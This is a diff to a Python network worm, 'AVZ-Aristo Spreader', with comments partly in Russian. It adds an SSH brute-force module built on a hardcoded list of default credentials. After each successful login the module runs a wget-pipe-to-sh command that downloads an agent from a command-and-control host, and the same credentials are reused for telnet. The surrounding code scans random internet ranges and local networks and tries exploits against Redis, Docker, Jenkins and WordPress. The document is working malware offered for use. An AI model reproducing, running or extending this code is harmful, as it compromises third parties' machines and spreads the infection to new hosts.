@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.7.2 – глобальный и локальный режимы
+# AVZ-Aristo Spreader v25.8 – SSH brute, RDP, улучшенная обработка ошибок
 import asyncio, aiohttp, random, socket, time, json, os, subprocess, threading, sys, argparse
 import telnetlib
 import ipaddress
@@ -10,6 +10,14 @@ AGENT_URL = f"http://{C2_HOST}:{C2_PORT}/agent_bash.sh"
 MAX_CONCURRENT = 500
 TIMEOUT = 1.5
 DEFAULT_SCAN_COUNT = 10_000
+
+# SSH-учётки
+SSH_CREDS = [
+    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"), ("root","pass"),
+    ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin","1234"),
+    ("user","user"), ("user","password"), ("user","123456"),
+    ("test","test"), ("guest","guest"), ("root",""), ("admin",""), ("root","pceeq1s8wv")
+]
 
 RANGES = [f"{i}.0.0.0/8" for i in [1,2,3,4,5,8,9,12,14,15,20,23,24,31,34,35,37,38,40,41,43,44,45,46,47,49,50,51,52,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223]]
 
@@ -23,7 +31,6 @@ def random_ip():
     return ".".join(map(str, octets))
 
 def get_local_ips():
-    """Возвращает список IP локальной /24 сети, исключая себя."""
     try:
         local_ip = socket.gethostbyname(socket.gethostname())
     except:
@@ -39,6 +46,23 @@ async def probe_port(ip, port):
         return True
     except:
         return False
+
+async def ssh_brute(ip):
+    """Асинхронный SSH-брут через asyncssh (требуется pip install asyncssh)"""
+    try:
+        import asyncssh
+    except ImportError:
+        # fallback to paramiko
+        pass
+    for u, p in SSH_CREDS:
+        try:
+            async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=2) as conn:
+                result = await conn.run(f"wget -O- {AGENT_URL} | sh")
+                if result.exit_status == 0:
+                    return True
+        except:
+            pass
+    return False
 
 async def exploit_redis(ip):
     try:
@@ -74,8 +98,7 @@ async def exploit_jenkins(ip):
         return False
 
 async def exploit_telnet(ip):
-    creds = [("root","root"),("admin","admin"),("root","admin"),("admin","password"),("root","123456"),("admin","123456"),("user","user"),("test","test"),("guest","guest")]
-    for u,p in creds:
+    for u,p in SSH_CREDS:
         try:
             tn = telnetlib.Telnet(ip, 23, timeout=2)
             tn.read_until(b"login: ", 1)
@@ -113,6 +136,9 @@ async def exploit_wordpress(ip):
 async def infect(ip):
     ports = [22, 23, 80, 443, 2375, 6379, 8080, 9200]
     open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
+    # SSH брут – главный вектор
+    if open_ports[0] and await ssh_brute(ip):
+        return True
     if open_ports[5] and await exploit_redis(ip):
         return True
     if open_ports[4] and await exploit_docker(ip):
@@ -169,8 +195,8 @@ async def local_scan():
 def main():
     parser = argparse.ArgumentParser()
     group = parser.add_mutually_exclusive_group()
-    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT, help='Количество случайных IP для глобального сканирования')
-    group.add_argument('--local', action='store_true', help='Сканировать локальную /24 сеть')
+    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
+    group.add_argument('--local', action='store_true')
     args = parser.parse_args()
 
     if args.local:
